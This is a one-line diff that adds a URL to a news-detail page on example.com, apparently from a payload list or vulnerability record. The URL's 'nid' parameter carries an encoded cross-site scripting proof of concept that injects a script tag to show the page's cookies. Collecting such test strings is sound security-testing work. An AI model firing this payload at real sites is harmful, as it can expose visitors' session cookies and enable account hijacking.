@@ -1,0 +1,1 @@
+http://www.example.com/news/news_detail.php?nid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
